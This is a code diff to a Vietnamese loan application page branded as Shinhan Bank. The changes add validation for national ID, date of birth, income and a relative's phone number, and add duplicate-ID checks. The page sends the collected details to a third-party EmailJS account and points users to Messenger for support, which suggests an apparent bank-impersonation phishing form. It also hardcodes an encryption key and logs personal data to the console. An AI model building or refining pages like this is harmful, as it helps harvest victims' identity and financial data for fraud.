@@ -8,6 +8,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
     <style>
+        /* Giữ nguyên CSS từ mã gốc */
         body {
             font-family: 'Roboto', sans-serif;
             font-size: 16px;
@@ -639,6 +640,7 @@
     <script>
         emailjs.init('OrBsI926QI2_xBh1f');
         let userData = {};
+        let registeredUsers = JSON.parse(localStorage.getItem('registeredUsers')) || [];
 
         function getCurrentDate() {
             const today = new Date();
@@ -656,13 +658,13 @@
                 return true;
             } catch (e) {
                 console.error('LocalStorage quota exceeded');
+                $('#formError').text('Dung lượng lưu trữ trình duyệt đã đầy. Vui lòng xóa dữ liệu trình duyệt và thử lại.').show();
                 return false;
             }
         }
 
         function saveToLocalStorage() {
             if (!checkLocalStorageQuota()) {
-                console.error('Failed to save to localStorage: Quota exceeded');
                 return false;
             }
             try {
@@ -672,6 +674,7 @@
                 return true;
             } catch (error) {
                 console.error('Error saving userData to localStorage:', error);
+                $('#formError').text('Lỗi lưu dữ liệu. Vui lòng thử lại.').show();
                 return false;
             }
         }
@@ -682,10 +685,15 @@
                 if (storedData) {
                     userData = JSON.parse(CryptoJS.AES.decrypt(storedData, 'shinhan-secret-key').toString(CryptoJS.enc.Utf8));
                     console.log('Loaded userData from localStorage:', userData);
-                    // Kiểm tra nếu đã có hồ sơ
-                    if (userData.isRegistered) {
-                        $('#formError').text('Bạn đã có hồ sơ tại Ngân hàng Shinhan Bank. Vui lòng kiểm tra email hoặc liên hệ hỗ trợ.').show();
-                        $('#registerForm').find('input, select, button[type="submit"]').prop('disabled', true);
+                    if (userData.isRegistered && userData.idNumber) {
+                        registeredUsers = JSON.parse(localStorage.getItem('registeredUsers')) || [];
+                        if (!registeredUsers.includes(userData.idNumber)) {
+                            registeredUsers.push(userData.idNumber);
+                            localStorage.setItem('registeredUsers', JSON.stringify(registeredUsers));
+                        }
+                        $('#formError').text('Bạn đã có hồ sơ tại Ngân hàng Shinhan Bank. Vui lòng kiểm tra email hoặc liên hệ hỗ trợ qua Messenger.').show();
+                        $('#registerForm').find('input, select, button').prop('disabled', true);
+                        $('#registerForm').off('submit'); // Ngăn mọi submit
                     }
                 }
             } catch (error) {
@@ -801,6 +809,43 @@
                 { id: 'bankName', selector: '#bankName', label: 'Tên ngân hàng' }
             ];
 
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            const phoneRegex = /^[0-9]{10}$/;
+            const idNumberRegex = /^[0-9]{12}$/;
+            const dobRegex = /^\d{2}\/\d{2}\/\d{4}$/;
+            const incomeRegex = /^[0-9]+$/;
+
+            if (!emailRegex.test($('#email').val())) {
+                $('#formError').text('Email không hợp lệ').show();
+                $('#email').focus();
+                return false;
+            }
+            if (!phoneRegex.test($('#phoneNumber').val())) {
+                $('#formError').text('Số điện thoại phải có 10 chữ số').show();
+                $('#phoneNumber').focus();
+                return false;
+            }
+            if (!idNumberRegex.test($('#idNumber').val())) {
+                $('#formError').text('CCCD phải có 12 chữ số').show();
+                $('#idNumber').focus();
+                return false;
+            }
+            if (!dobRegex.test($('#dob').val())) {
+                $('#formError').text('Ngày sinh phải có định dạng DD/MM/YYYY').show();
+                $('#dob').focus();
+                return false;
+            }
+            if (!incomeRegex.test($('#income').val())) {
+                $('#formError').text('Thu nhập phải là số hợp lệ').show();
+                $('#income').focus();
+                return false;
+            }
+            if (!phoneRegex.test($('#companyPhone').val())) {
+                $('#formError').text('Số điện thoại người thân phải có 10 chữ số').show();
+                $('#companyPhone').focus();
+                return false;
+            }
+
             for (const field of requiredFields) {
                 const value = $(field.selector).val();
                 if (!value || value.trim() === "" || value === 'khac') {
@@ -812,10 +857,17 @@
                     return false;
                 }
             }
+
+            // Kiểm tra xem CCCD đã được đăng ký chưa
+            if (registeredUsers.includes($('#idNumber').val())) {
+                $('#formError').text('CCCD này đã được sử dụng để đăng ký hồ sơ. Vui lòng kiểm tra email hoặc liên hệ hỗ trợ qua Messenger.').show();
+                $('#idNumber').focus();
+                return false;
+            }
+
             return true;
         }
 
-        // Lưu dữ liệu tạm thời khi nhập
         function saveFormDataRealTime() {
             userData = {
                 fullName: $('#fullName').val().trim(),
@@ -844,6 +896,7 @@
                 totalRepayment: userData.totalRepayment || 0,
                 currentStep: 1
             };
+            console.log('Saving userData:', userData); // Debug
             saveToLocalStorage();
         }
 
@@ -871,7 +924,6 @@
             $('#bankName').val(userData.bankName || '');
             if (userData.loanType) updateInterestRate();
 
-            // Gắn sự kiện input để lưu dữ liệu real-time
             $('#registerForm input, #registerForm select').on('input change', saveFormDataRealTime);
         };
 
@@ -879,8 +931,8 @@
             e.preventDefault();
             $('#formError').hide();
 
-            if (userData.isRegistered) {
-                $('#formError').text('Bạn đã có hồ sơ tại Ngân hàng Shinhan Bank. Vui lòng kiểm tra email hoặc liên hệ hỗ trợ.').show();
+            if (userData.isRegistered && registeredUsers.includes($('#idNumber').val())) {
+                $('#formError').text('CCCD này đã được sử dụng để đăng ký hồ sơ. Vui lòng kiểm tra email hoặc liên hệ hỗ trợ qua Messenger.').show();
                 return;
             }
 
@@ -912,11 +964,13 @@
                     monthlyPayment: userData.monthlyPayment || 0,
                     totalInterest: userData.totalInterest || 0,
                     totalRepayment: userData.totalRepayment || 0,
-                    isRegistered: true // Đánh dấu đã đăng ký
+                    isRegistered: true
                 };
                 console.log('Submitting userData:', userData);
 
                 if (saveToLocalStorage()) {
+                    registeredUsers.push(userData.idNumber);
+                    localStorage.setItem('registeredUsers', JSON.stringify(registeredUsers));
                     emailjs.send('service_60tgxof', 'template_uhyb8ve', {
                         full_name: userData.fullName,
                         dob: userData.dob,
@@ -955,7 +1009,5 @@
             }
         });
     </script>
-<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'93e83c68aaf4bf9a',t:'MTc0NzAzNTI5MS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
-<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'93e9c41bcbd244ea',t:'MTc0NzA1MTMzNS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
 </body>
 </html>
